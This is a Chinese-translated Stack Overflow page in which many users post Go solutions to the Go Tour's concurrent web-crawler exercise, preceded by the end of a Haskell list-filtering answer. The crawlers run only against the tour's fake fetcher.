    c1 = ("a","x")
    d1 = [ ("x","b"), ("z","c"), ("x","b"), ("z","c")
         , ("x","b"), ("z","c"), ("x","b"), ("z","c") ]

    getByOne c1 a1 = catMaybes
            [ if x == snd c1
              then Just (fst c1, y)
              else Nothing | (x, y) <- a1 ] 
    ```

5.  更好的是，使用警卫并摆脱 if then else：

    ```
    getByOne (a, b) a1 = [ (a, d) | (c, d) <- a1
                                  , b == c ] 
    ```

或者，如果你想使用过滤器，你首先过滤匹配的元组列表，然后用 map 构建相应的结果：

```
getByOne (a, b) a1 = map (\(_, c) -> (a, c))
                     . filter (\(c, _) -> b == c)
                     $ a1 
```

这简化为

```
getByOne (a, b) = map (\(_, c) -> (a, c))
                     . filter (\(c, _) -> b == c) 
```

# go - 围棋练习之旅 #10：爬虫

> ID：13217547
> 
> 赞同：26
> 
> 时间：2012-11-04T09:49:22.680
> 
> 标签：go

我正在参加 Go Tour，感觉除了并发之外我对该语言有很好的理解。

[幻灯片 10](https://tour.golang.org/concurrency/10)是一个要求读者并行化网络爬虫的练习（并使其不包括重复，但我还没有到达那里。）

这是我到目前为止所拥有的：

```
func Crawl(url string, depth int, fetcher Fetcher, ch chan string) {
    if depth <= 0 {
        return
    }

    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        ch <- fmt.Sprintln(err)
        return
    }

    ch <- fmt.Sprintf("found: %s %q\n", url, body)
    for _, u := range urls {
        go Crawl(u, depth-1, fetcher, ch)
    }
}

func main() {
    ch := make(chan string, 100)
    go Crawl("http://golang.org/", 4, fetcher, ch)

    for i := range ch {
        fmt.Println(i)
    }
} 
```

我的问题是，我在哪里`close(ch)`打电话。

如果我`defer close(ch)`在`Crawl`方法中的某个地方放了一个，那么程序最终会从一个生成的 goroutine 写入一个封闭的通道，因为调用`Crawl`将在生成的 goroutine 之前返回。

如果我省略了对 的调用`close(ch)`，正如我所展示的那样，程序会在覆盖通道的主函数中死锁，因为当所有 goroutines 返回时，通道永远不会关闭。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-04T22:57:42.893

[查看Effective Go](http://golang.org/doc/effective_go.html#parallel)的 Parallelization 部分可以找到解决方案的想法。本质上，您必须在函数的每个返回路径上关闭通道。实际上，这是 defer 语句的一个很好的用例：

```
func Crawl(url string, depth int, fetcher Fetcher, ret chan string) {
    defer close(ret)
    if depth <= 0 {
        return
    }

    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        ret <- err.Error()
        return
    }

    ret <- fmt.Sprintf("found: %s %q", url, body)

    result := make([]chan string, len(urls))
    for i, u := range urls {
        result[i] = make(chan string)
        go Crawl(u, depth-1, fetcher, result[i])
    }

    for i := range result {
        for s := range result[i] {
            ret <- s
        }
    }

    return
}

func main() {
    result := make(chan string)
    go Crawl("http://golang.org/", 4, fetcher, result)

    for s := range result {
        fmt.Println(s)
    }
} 
```

与您的代码的本质区别在于，每个 Crawl 实例都有自己的返回通道，调用函数在其返回通道中收集结果。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2016-04-22T17:14:25.213

我与这个完全不同的方向。我可能被关于使用地图的提示误导了。

```
// SafeUrlMap is safe to use concurrently.
type SafeUrlMap struct {
    v   map[string]string
    mux sync.Mutex
}

func (c *SafeUrlMap) Set(key string, body string) {
    c.mux.Lock()
    // Lock so only one goroutine at a time can access the map c.v.
    c.v[key] = body
    c.mux.Unlock()
}

// Value returns mapped value for the given key.
func (c *SafeUrlMap) Value(key string) (string, bool) {
    c.mux.Lock()
    // Lock so only one goroutine at a time can access the map c.v.
    defer c.mux.Unlock()
    val, ok := c.v[key]
    return val, ok
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher, urlMap SafeUrlMap) {
    defer wg.Done()
    urlMap.Set(url, body)

    if depth <= 0 {
        return
    }

    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        return
    }

    for _, u := range urls {
        if _, ok := urlMap.Value(u); !ok {
            wg.Add(1)
            go Crawl(u, depth-1, fetcher, urlMap)
        }
    }

    return
}

var wg sync.WaitGroup

func main() {
    urlMap := SafeUrlMap{v: make(map[string]string)}

    wg.Add(1)
    go Crawl("http://golang.org/", 4, fetcher, urlMap)
    wg.Wait()

    for url := range urlMap.v {
        body, _ := urlMap.Value(url)
        fmt.Printf("found: %s %q\n", url, body)
    }
} 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2016-09-21T19:18:01.377

O(1) 时间在地图上查找 url 而不是 O(n) 在所有访问的 url 切片上查找应该有助于最大限度地减少在关键部分内花费的时间，这对于本示例来说是微不足道的时间量，但会与规模相关.

WaitGroup 用于防止顶级 Crawl() 函数返回，直到所有子 go 例程完成。

```
func Crawl(url string, depth int, fetcher Fetcher) {
    var str_map = make(map[string]bool)
    var mux sync.Mutex
    var wg sync.WaitGroup

    var crawler func(string,int)
    crawler = func(url string, depth int) {
        defer wg.Done()

        if depth <= 0 {
            return
        }   

        mux.Lock()
        if _, ok := str_map[url]; ok {
            mux.Unlock()
            return;
        }else{
            str_map[url] = true
            mux.Unlock()
        }

        body, urls, err := fetcher.Fetch(url)
        if err != nil {
            fmt.Println(err)
            return
        }
        fmt.Printf("found: %s %q %q\n", url, body, urls)

        for _, u := range urls {
            wg.Add(1)
            go crawler(u, depth-1)          
        }       
    }
    wg.Add(1)
    crawler(url,depth)
    wg.Wait()   
}

func main() {
    Crawl("http://golang.org/", 4, fetcher)
} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2019-03-09T05:17:36.067

与接受的答案类似的想法，但没有提取重复的 URL，并直接打印到控制台。defer() 也没有使用。当 goroutines 完成时，我们使用通道来发出信号。SafeMap 的想法是从前面介绍的 SafeCounter 中提出来的。

对于子 goroutine，我们创建一个通道数组，并通过在通道上等待直到每个孩子返回。

```
package main

import (
    "fmt"
    "sync"
)

// SafeMap is safe to use concurrently.
type SafeMap struct {
    v   map[string] bool
    mux sync.Mutex
}

// SetVal sets the value for the given key.
func (m *SafeMap) SetVal(key string, val bool) {
    m.mux.Lock()
    // Lock so only one goroutine at a time can access the map c.v.
    m.v[key] = val
    m.mux.Unlock()
}

// Value returns the current value of the counter for the given key.
func (m *SafeMap) GetVal(key string) bool {
    m.mux.Lock()
    // Lock so only one goroutine at a time can access the map c.v.
    defer m.mux.Unlock()
    return m.v[key]
}

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher, status chan bool, urlMap SafeMap) {

    // Check if we fetched this url previously.
    if ok := urlMap.GetVal(url); ok {
        //fmt.Println("Already fetched url!")
        status <- true
        return 
    }

    // Marking this url as fetched already.
    urlMap.SetVal(url, true)

    if depth <= 0 {
        status <- false
        return
    }

    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        status <- false
        return
    }

    fmt.Printf("found: %s %q\n", url, body)

    statuses := make ([]chan bool, len(urls)) 
    for index, u := range urls {
        statuses[index] = make (chan bool)
        go Crawl(u, depth-1, fetcher, statuses[index], urlMap)
    }

    // Wait for child goroutines.
    for _, childstatus := range(statuses) {
        <- childstatus
    }

    // And now this goroutine can finish.
    status <- true

    return
}

func main() {
    urlMap := SafeMap{v: make(map[string] bool)}
    status := make(chan bool)
    go Crawl("https://golang.org/", 4, fetcher, status, urlMap)
    <- status
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2019-07-21T16:41:01.683

我认为使用映射（就像我们可以在其他语言中使用集合一样）和互斥锁是最简单的方法：

```
func Crawl(url string, depth int, fetcher Fetcher) {
    mux.Lock()
    defer mux.Unlock()
    if depth <= 0 || IsVisited(url) {
        return
    }
    visit[url] = true
    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("found: %s %q\n", url, body)
    for _, u := range urls {
        //
        go Crawl(u, depth-1, fetcher)
    }
    return
}

func IsVisited(s string) bool {
    _, ok := visit[s]
    return ok
}

var mux sync.Mutex

var visit = make(map[string]bool)

func main() {
    Crawl("https://golang.org/", 4, fetcher)
    time.Sleep(time.Second)
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-04-08T09:28:24.040

这是我的版本（受[@fasmat的回答启发）——这个版本通过使用带有](https://stackoverflow.com/users/1680661/fasmat)[RWMutex](https://golang.org/pkg/sync/#RWMutex)的自定义缓存来防止两次获取相同的 URL 。

```
type Cache struct {
    data map[string]fakeResult
    mux sync.RWMutex
}

var cache = Cache{data: make(map[string]fakeResult)}

//cache adds new page to the global cache
func (c *Cache) cache(url string) fakeResult {
    c.mux.Lock()

    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        body = err.Error()
    }

    data := fakeResult{body, urls}
    c.data[url] = data

    c.mux.Unlock()

    return data
}

//Visit visites the page at given url and caches it if needec
func (c *Cache) Visit(url string) (data fakeResult, alreadyCached bool) {
    c.mux.RLock()
    data, alreadyCached = c.data[url]
    c.mux.RUnlock()

    if !alreadyCached {
        data = c.cache(url)
    }

    return data, alreadyCached
}

/*
Crawl crawles all pages reachable from url and within the depth (given by args).
Fetches pages using given fetcher and caches them in the global cache.
Continously sends newly discovered pages to the out channel.
*/
func Crawl(url string, depth int, fetcher Fetcher, out chan string) {
    defer close(out)

    if depth <= 0 {
        return
    }

    data, alreadyCached := cache.Visit(url)
    if alreadyCached {
        return
    }

    //send newly discovered page to out channel
    out <- fmt.Sprintf("found: %s %q", url, data.body)

    //visit linked pages
    res := make([]chan string, len(data.urls))

    for i, link := range data.urls {
        res[i] = make(chan string)
        go Crawl(link, depth-1, fetcher, res[i])
    }

    //send newly discovered pages from links to out channel
    for i := range res {
        for s := range res[i] {
            out <- s
        }
    }
}

func main() {
    res := make(chan string)
    go Crawl("https://golang.org/", 4, fetcher, res)

    for page := range res {
        fmt.Println(page)   
    }
} 
```

除了不获取 URL 两次之外，此解决方案不使用预先知道总页数的事实（适用于任意数量的页面），并且不会通过计时器错误地限制/延长程序执行时间。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-11-15T01:44:42.883

这是我的解决方案。我有一个“主”例程，它侦听一个 url 通道并在找到要抓取的新 url 时启动新的爬取例程（将爬取的 url 放入通道中）。

我没有显式关闭通道，而是为未完成的爬取 goroutines 设置了一个计数器，当计数器为 0 时，程序退出，因为它没有什么可等待的。

```
func doCrawl(url string, fetcher Fetcher, results chan []string) {
    body, urls, err := fetcher.Fetch(url)
    results <- urls

    if err != nil {
        fmt.Println(err)
    } else {
        fmt.Printf("found: %s %q\n", url, body)
    }
}

func Crawl(url string, depth int, fetcher Fetcher) {
    results := make(chan []string)
    crawled := make(map[string]bool)
    go doCrawl(url, fetcher, results)
    // counter for unfinished crawling goroutines
    toWait := 1

    for urls := range results {
        toWait--

        for _, u := range urls {
            if !crawled[u] {
                crawled[u] = true
                go doCrawl(u, fetcher, results)
                toWait++
            }
        }

        if toWait == 0 {
            break
        }
    }
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-09-23T16:57:56.270

这是我的解决方案，使用 sync.WaitGroup 和获取的 URL 的 SafeCache：

```
package main

import (
    "fmt"
    "sync"
)

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

// Safe to use concurrently
type SafeCache struct {
    fetched map[string]string
    mux     sync.Mutex
}

func (c *SafeCache) Add(url, body string) {
    c.mux.Lock()
    defer c.mux.Unlock()

    if _, ok := c.fetched[url]; !ok {
        c.fetched[url] = body
    }
}

func (c *SafeCache) Contains(url string) bool {
    c.mux.Lock()
    defer c.mux.Unlock()

    _, ok := c.fetched[url]
    return ok
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher, cache SafeCache,
    wg *sync.WaitGroup) {

    defer wg.Done()
    if depth <= 0 {
        return
    }
    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("found: %s %q\n", url, body)
    cache.Add(url, body)
    for _, u := range urls {
        if !cache.Contains(u) {
            wg.Add(1)
            go Crawl(u, depth-1, fetcher, cache, wg)
        }
    }
    return
}

func main() {
    cache := SafeCache{fetched: make(map[string]string)}
    var wg sync.WaitGroup

    wg.Add(1)
    Crawl("http://golang.org/", 4, fetcher, cache, &wg)
    wg.Wait()
} 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-05-12T23:36:54.563

下面是我的解决方案。除了全局地图，我只需要更改`Crawl`. 像其他解决方案一样，我使用`sync.Map`和`sync.WaitGroup`. 我已经屏蔽了重要的部分。

```
var m sync.Map

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher) {
    // This implementation doesn't do either:
    if depth <= 0 {
        return
    }
    // Don't fetch the same URL twice.
    /////////////////////////////////////
    _, ok := m.LoadOrStore(url, url)   //
    if ok {                            //
        return                         //
    }                                  //
    /////////////////////////////////////
    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("found: %s %q\n", url, body)
    // Fetch URLs in parallel.
    /////////////////////////////////////
    var wg sync.WaitGroup              //
    defer wg.Wait()                    //
    for _, u := range urls {           //
        wg.Add(1)                      //
        go func(u string) {            //
            defer wg.Done()            //
            Crawl(u, depth-1, fetcher) //
        }(u)                           //
    }                                  //
    /////////////////////////////////////
    return
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-03-31T10:57:42.007

我将 safeCounter 和 waitGroup 传递给 Crawl 函数，然后使用 safeCounter 跳过已访问的 url，waitGroup 以防止提前退出当前 goroutine。

```
func Crawl(url string, depth int, fetcher Fetcher, c *SafeCounter, wg *sync.WaitGroup) {
    defer wg.Done()

    if depth <= 0 {
        return
    }

    c.mux.Lock()
    c.v[url]++
    c.mux.Unlock()

    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("found: %s %q\n", url, body)
    for _, u := range urls {
        c.mux.Lock()
        i := c.v[u]
        c.mux.Unlock()
        if i == 1 {
            continue
        }
        wg.Add(1)
        go Crawl(u, depth-1, fetcher, c, wg)
    }
    return
}

func main() {
    c := SafeCounter{v: make(map[string]int)}
    var wg sync.WaitGroup
    wg.Add(1)
    Crawl("https://golang.org/", 4, fetcher, &c, &wg)
    wg.Wait()
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2020-07-27T06:17:24.960

```
/*
Exercise: Web Crawler
In this exercise you'll use Go's concurrency features to parallelize a web crawler.

Modify the Crawl function to fetch URLs in parallel without fetching the same URL twice.

Hint: you can keep a cache of the URLs that have been fetched on a map, but maps alone are not safe for concurrent use!
*/

package main

import (
    "fmt"
    "sync"
    "time"
)

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

type Response struct {
    url  string
    urls []string
    body string
    err  error
}

var ch chan Response = make(chan Response)
var fetched map[string]bool = make(map[string]bool)
var wg sync.WaitGroup
var mu sync.Mutex

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher) {
    // TODO: Fetch URLs in parallel.
    // TODO: Don't fetch the same URL twice.
    // This implementation doesn't do either:
    var fetch func(url string, depth int, fetcher Fetcher)
    wg.Add(1)
    recv := func() {
        for res := range ch {
            body, _, err := res.body, res.urls, res.err
            if err != nil {
                fmt.Println(err)
                continue
            }
            fmt.Printf("found: %s %q\n", url, body)
        }
    }

    fetch = func(url string, depth int, fetcher Fetcher) {
        time.Sleep(time.Second / 2)
        defer wg.Done()
        if depth <= 0 || fetched[url] {
            return
        }
        mu.Lock()
        fetched[url] = true
        mu.Unlock()
        body, urls, err := fetcher.Fetch(url)
        for _, u := range urls {
            wg.Add(1)
            go fetch(u, depth-1, fetcher)
        }
        ch <- Response{url, urls, body, err}
    }

    go fetch(url, depth, fetcher)
    go recv()
    return
}

func main() {
    Crawl("https://golang.org/", 4, fetcher)
    wg.Wait()
}

// fakeFetcher is Fetcher that returns canned results.
type fakeFetcher map[string]*fakeResult

type fakeResult struct {
    body string
    urls []string
}

func (f fakeFetcher) Fetch(url string) (string, []string, error) {
    if res, ok := f[url]; ok {
        return res.body, res.urls, nil
    }
    return "", nil, fmt.Errorf("not found: %s", url)
}

// fetcher is a populated fakeFetcher.
var fetcher = fakeFetcher{
    "https://golang.org/": &fakeResult{
        "The Go Programming Language",
        []string{
            "https://golang.org/pkg/",
            "https://golang.org/cmd1/",
        },
    },
    "https://golang.org/pkg/": &fakeResult{
        "Packages",
        []string{
            "https://golang.org/",
            "https://golang.org/cmd2/",
            "https://golang.org/pkg/fmt/",
            "https://golang.org/pkg/os/",
        },
    },
    "https://golang.org/pkg/fmt/": &fakeResult{
        "Package fmt",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
    "https://golang.org/pkg/os/": &fakeResult{
        "Package os",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
} 
```

[https://gist.github.com/gaogao1030/5d63ed925534f3610ccb7e25ed46992a](https://gist.github.com/gaogao1030/5d63ed925534f3610ccb7e25ed46992a)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2021-08-23T10:32:59.047

这是我的解决方案。我使用空结构作为安全缓存中的值，因为它们没有分配任何内存。我基于 os [whossname](https://stackoverflow.com/users/2161613/whossname)的解决方案。

```
 package main

    import (
        "fmt"
        "sync"
    )

    type Fetcher interface {
        // Fetch returns the body of URL and
        // a slice of URLs found on that page.
        Fetch(url string) (body string, urls []string, err error)
    }

    type safeCache struct {
        m map[string]struct{}
        c sync.Mutex
    } 

    func (s *safeCache) Get(key string) bool {
        s.c.Lock()
        defer s.c.Unlock()
        if _,ok:=s.m[key];!ok{
            return false
        }
        return true
    }

    func (s *safeCache) Set(key string) {
        s.c.Lock()
        s.m[key] = struct{}{}
        s.c.Unlock()
        return
    }

    // Crawl uses fetcher to recursively crawl
    // pages starting with url, to a maximum of depth.
    func Crawl(url string, depth int, fetcher Fetcher, cach safeCache) {
        defer wg.Done()
        // TODO: Fetch URLs in parallel.
        // TODO: Don't fetch the same URL twice.
        // This implementation doesn't do either:
        cach.Set(url)
        if depth <= 0 {
            return
        }
        body, urls, err := fetcher.Fetch(url)
        if err != nil {
            fmt.Println(err)
            return
        }
        fmt.Printf("found: %s %q\n", url, body)
        for _, u := range urls {
            if found := cach.Get(u); !found{
                wg.Add(1)
                go Crawl(u, depth-1, fetcher, cach)
            }   
        }
        return
    }

    var wg sync.WaitGroup

    func main() {
        urlSafe := safeCache{m: make(map[string]struct{})}
        wg.Add(1)
        go Crawl("https://golang.org/", 4, fetcher, urlSafe)
        wg.Wait()
    }

    // fakeFetcher is Fetcher that returns canned results.
    type fakeFetcher map[string]*fakeResult

    type fakeResult struct {
        body string
        urls []string
    }

    func (f fakeFetcher) Fetch(url string) (string, []string, error) {
        if res, ok := f[url]; ok {
            return res.body, res.urls, nil
        }
        return "", nil, fmt.Errorf("not found: %s", url)
    }

    // fetcher is a populated fakeFetcher.
    var fetcher = fakeFetcher{
        "https://golang.org/": &fakeResult{
            "The Go Programming Language",
            []string{
                "https://golang.org/pkg/",
                "https://golang.org/cmd/",
            },
        },
        "https://golang.org/pkg/": &fakeResult{
            "Packages",
            []string{
                "https://golang.org/",
                "https://golang.org/cmd/",
                "https://golang.org/pkg/fmt/",
                "https://golang.org/pkg/os/",
            },
        },
        "https://golang.org/pkg/fmt/": &fakeResult{
            "Package fmt",
            []string{
                "https://golang.org/",
                "https://golang.org/pkg/",
            },
        },
        "https://golang.org/pkg/os/": &fakeResult{
            "Package os",
            []string{
                "https://golang.org/",
                "https://golang.org/pkg/",
            },
        },
    } 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-05-10T15:10:47.410

我用一个简单的通道实现了它，所有的 goroutine 都在其中发送消息。为了确保在没有更多 goroutines 时关闭它，我使用了一个安全计数器，当计数器为 0 时关闭通道。

```
type Msg struct {
    url string
    body string
}

type SafeCounter struct {
    v int
    mux sync.Mutex
}

func (c *SafeCounter) inc() {
    c.mux.Lock()
    defer c.mux.Unlock()
    c.v++   
}

func (c *SafeCounter) dec(ch chan Msg) {
    c.mux.Lock()
    defer c.mux.Unlock()
    c.v--
    if c.v == 0 {
        close(ch)
    }
}

var goes SafeCounter = SafeCounter{v: 0}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher, ch chan Msg) {
    defer goes.dec(ch)
    // TODO: Fetch URLs in parallel.
    // TODO: Don't fetch the same URL twice.
    // This implementation doesn't do either:
    if depth <= 0 {
        return
    }
    if !cache.existsAndRegister(url) {
        body, urls, err :=  fetcher.Fetch(url)
        if err != nil {
            fmt.Println(err)
            return
        }
        ch <- Msg{url, body}
        for _, u := range urls {
            goes.inc()
            go Crawl(u, depth-1, fetcher, ch)
        }
    }
    return
}

func main() {
    ch := make(chan Msg, 100)
    goes.inc()
    go Crawl("http://golang.org/", 4, fetcher, ch)
    for m := range ch {
        fmt.Printf("found: %s %q\n", m.url, m.body)
    }
} 
```

请注意，安全计数器必须在 goroutine 之外递增。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-09-10T07:13:39.587

我使用 slice 避免了两次抓取 url，没有并发的递归版本是可以的，但不确定这个并发版本。

```
func Crawl(url string, depth int, fetcher Fetcher) {
    var str_arrs []string
    var mux sync.Mutex

    var crawl func(string, int)
    crawl = func(url string, depth int) {
        if depth <= 0 {
            return
        }

        mux.Lock()
        for _, v := range str_arrs {
            if url == v {
                mux.Unlock()
                return
            }
        }
        str_arrs = append(str_arrs, url)
        mux.Unlock()

        body, urls, err := fetcher.Fetch(url)
        if err != nil {
            fmt.Println(err)
            return
        }
        fmt.Printf("found: %s %q\n", url, body)
        for _, u := range urls {
            go crawl(u, depth-1) // could delete “go” then it is recursive
        }
    }

    crawl(url, depth)
    return
}

func main() {
    Crawl("http://golang.org/", 4, fetcher)
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2019-02-14T14:30:50.033

下面是一个仅使用同步 waitGroup 的简单并行化解决方案。

```
var fetchedUrlMap = make(map[string]bool)
var mutex sync.Mutex

func Crawl(url string, depth int, fetcher Fetcher) {
	//fmt.Println("In Crawl2 with url" , url)
	if _, ok := fetchedUrlMap[url]; ok {
		return
	}

	if depth <= 0 {
		return
	}
	body, urls, err := fetcher.Fetch(url)
	mutex.Lock()
	fetchedUrlMap[url] = true
	mutex.Unlock()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("found: %s %q\n", url, body)

	var wg sync.WaitGroup
	for _, u := range urls {
		//	fmt.Println("Solving for ", u)
		wg.Add(1)
		go func(uv string) {
			Crawl(uv, depth-1, fetcher)
			wg.Done()
		}(u)
	}
	wg.Wait()
}
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2020-02-16T18:29:29.893

这是我的解决方案:)

```
package main

import (
    "fmt"
    "runtime"
    "sync"
)

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher, set map[string]bool) {
    // TODO: Fetch URLs in parallel.
    // TODO: Don't fetch the same URL twice.
    // This implementation doesn't do either:
    if depth <= 0 {
        return
    }
    // use a set to identify if the URL should be traversed or not
    if set[url] == true {
        wg.Done()
        return
    } else {
        fmt.Println(runtime.NumGoroutine())
        set[url] = true
        body, urls, err := fetcher.Fetch(url)
        if err != nil {
            fmt.Println(err)
            return
        }
        fmt.Printf("found: %s %q\n", url, body)
        for _, u := range urls {
            Crawl(u, depth-1, fetcher, set)
        }

    }

}

var wg sync.WaitGroup

func main() {
    wg.Add(6)
    collectedURLs := make(map[string]bool)
    go Crawl("https://golang.org/", 4, fetcher, collectedURLs)
    wg.Wait()
}

// fakeFetcher is Fetcher that returns canned results.
type fakeFetcher map[string]*fakeResult

type fakeResult struct {
    body string
    urls []string
}

func (f fakeFetcher) Fetch(url string) (string, []string, error) {
    if res, ok := f[url]; ok {
        return res.body, res.urls, nil
    }
    return "", nil, fmt.Errorf("not found: %s", url)
}

// fetcher is a populated fakeFetcher.
var fetcher = fakeFetcher{
    "https://golang.org/": &fakeResult{
        "The Go Programming Language",
        []string{
            "https://golang.org/pkg/",
            "https://golang.org/cmd/",
        },
    },
    "https://golang.org/pkg/": &fakeResult{
        "Packages",
        []string{
            "https://golang.org/",
            "https://golang.org/cmd/",
            "https://golang.org/pkg/fmt/",
            "https://golang.org/pkg/os/",
        },
    },
    "https://golang.org/pkg/fmt/": &fakeResult{
        "Package fmt",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
    "https://golang.org/pkg/os/": &fakeResult{
        "Package os",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
} 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2020-07-06T18:07:59.070

由于这里的大多数解决方案都不适合我（包括接受的答案），我将上传我自己的灵感来自卡米尔（特别感谢 :)（没有重复/所有有效的 URL）

```
package main

import (
    "fmt"
    "runtime"
    "sync"
)

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher, set map[string]bool) {
    // TODO: Fetch URLs in parallel.
    // TODO: Don't fetch the same URL twice.
    if depth <= 0 { return }
    // use a set to identify if the URL should be traversed or not
    fmt.Println(runtime.NumGoroutine())
    set[url] = true
    body, urls, err := fetcher.Fetch(url)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("found: %s %q\n", url, body)
    for _, u := range urls {
        if set[u] == false {
            wg.Add(1)
            go Crawl(u, depth-1, fetcher, set)
        }
    }
    wg.Done()
}

var wg sync.WaitGroup

func main() {
    collectedURLs := make(map[string]bool)
    Crawl("https://golang.org/", 4, fetcher, collectedURLs)
    wg.Wait()
} 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2020-11-02T12:51:13.030

这是我的解决方案。我有一个问题，主函数没有等待 goroutine 打印它们的状态并完成。我检查了上一张幻灯片是否使用了在退出前等待 1 秒的解决方案，因此我决定使用该方法。但在实践中，我相信一些协调机制会更好。

```
import (
    "fmt"
    "sync"
    "time"
)

type SafeMap struct {
    mu sync.Mutex
    v  map[string]bool
}

// Sets the given key to true.
func (sm *SafeMap) Set(key string) {
    sm.mu.Lock()
    sm.v[key] = true
    sm.mu.Unlock()
}

// Get returns the current value for the given key.
func (sm *SafeMap) Get(key string) bool {
    sm.mu.Lock()
    defer sm.mu.Unlock()
    return sm.v[key]
}

var safeMap = SafeMap{v: make(map[string]bool)}

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher) {
    if depth <= 0 {
        return
    }

    // if the value exists, don't fetch it twice
    if safeMap.Get(url) {
        return  
    }

    // check if there is an error fetching
    body, urls, err := fetcher.Fetch(url)
    safeMap.Set(url)
    if err != nil {
        fmt.Println(err)
        return
    }

    // list contents and crawl recursively
    fmt.Printf("found: %s %q\n", url, body)
    for _, u := range urls {
        go Crawl(u, depth-1, fetcher)
    }
}

func main() {
    go Crawl("https://golang.org/", 4, fetcher)
    time.Sleep(time.Second)
} 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2021-09-28T20:19:24.060

无需更改任何签名或在全局范围内引入任何新内容。我们可以使用 a[`sync.WaitGroup`](https://pkg.go.dev/sync#WaitGroup)来等待`recurse`goroutine 完成。从字符串到空结构的A`map`充当一个集合，是保持已抓取 URL 计数的最有效方法。

```
func Crawl(url string, depth int, fetcher Fetcher) {
    visited := make(map[string]struct{})
    var mu sync.Mutex
    var wg sync.WaitGroup

    var recurse func(string, int)
    recurse = func(url string, depth int) {
        defer wg.Done()

        if depth <= 0 {
            return
        }

        mu.Lock()
        defer mu.Unlock()

        if _, ok := visited[url]; ok {
            return
        }
        visited[url] = struct{}{}

        body, urls, err := fetcher.Fetch(url)
        if err != nil {
            fmt.Println(err)
            return
        }
        fmt.Printf("found: %s %q\n", url, body)

        for _, u := range urls {
            wg.Add(1)
            go recurse(u, depth-1)
        }
    }

    wg.Add(1)
    go recurse(url, depth)
    wg.Wait()
}

func main() {
    Crawl("https://golang.org/", 4, fetcher)
} 
```

**[Go Playground](https://play.golang.org/p/xLy_wA5wwMG)上的完整演示**

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2021-12-12T21:10:46.993

使用互斥锁和通道

```
package main

import (
    "fmt"
    "sync"
)

type SafeMap struct {
    mu sync.Mutex
    seen map[string]bool
}

func (s *SafeMap) getVal(url string) bool {
    s.mu.Lock()
    defer s.mu.Unlock()
    return s.seen[url]
}

func (s *SafeMap) setVal(url string) {
    s.mu.Lock()
    defer s.mu.Unlock()
    s.seen[url] = true
}

var s = SafeMap{seen: make(map[string]bool)}

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
